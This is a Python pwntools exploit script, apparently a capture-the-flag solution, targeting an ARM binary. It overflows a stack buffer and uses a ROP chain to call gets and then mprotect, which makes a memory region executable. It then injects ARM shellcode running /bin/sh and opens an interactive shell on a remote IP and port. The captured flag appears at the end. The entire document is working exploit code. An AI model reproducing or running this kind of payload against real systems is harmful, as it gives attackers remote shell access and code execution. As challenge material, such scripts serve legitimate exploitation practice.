from pwn import *


elf = ELF('./0.elf')


shellcode = "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x03\xa0\x52\x40\xc2\x71\x05\xb4\x69\x46\x0b\x27\x01\xdf\x7f\x40\x2f\x62\x69\x6e\x2f\x73\x68\x41"
# shellcode = "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x49\x40\x52\x40\xc2\x71\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x78"

# 0x000265f4 : mov r2, r4 ; bl #0x2613c ; add r0, r0, r4 ; pop {r4, pc}
pop_r0_r4 = 0x00025e1c
pop_r1 = 0x0006d108
pop_r3 = 0x00010160
pop_r456 = 0x00010c18
mov_r2_r1_pop_r4 = 0x000490dc
# 0x00058890 : pop {r4, lr} ; mov r0, r0 ; pop {r4, pc}
pop_r4_lr_r4_pc = 0x00058890

addr_dl_make_stack_executable = 0x00056a18
addr_data = 0x00095000

payload = b''
# payload += shellcode
payload += b'A' * (0x40 - len(payload))
payload += p32(0xdeadbeef)  # old fp

# gets(addr_data)
payload += p32(pop_r0_r4)
payload += p32(addr_data)
payload += p32(0xdeadbeef)
payload += p32(elf.symbols['gets'] + 0x4)  # skip instructions that push lr
payload += p32(0xcafebabe) * 4  # pad to return from gets

# lr = addr_data
payload += p32(pop_r4_lr_r4_pc)
payload += p32(0xdeadbeef)
payload += p32(addr_data)
payload += p32(0xdeadbeef)


# mprotect(addr_data, 0x1000, 7)
payload += p32(pop_r1)
payload += p32(0x7)
payload += p32(mov_r2_r1_pop_r4)
payload += p32(0xdeadbeef)
payload += p32(pop_r0_r4)
payload += p32(addr_data)
payload += p32(0xdeadbeef)
payload += p32(pop_r1)
payload += p32(0x1000)
payload += p32(elf.symbols['mprotect'])



# (*(shellcode))()
payload += p32(addr_data)


# context.log_level = 'DEBUG'

# io = process('qemu-arm ./0.elf', shell=True)
# io = process('qemu-arm -g 12345 ./0.elf', shell=True)
io = remote('114.177.250.4', 7777)
io.sendline(payload)

time.sleep(0.1)

io.sendline(shellcode)

io.interactive()


# ctrctf{mu1tip13_plaf0rm3r}
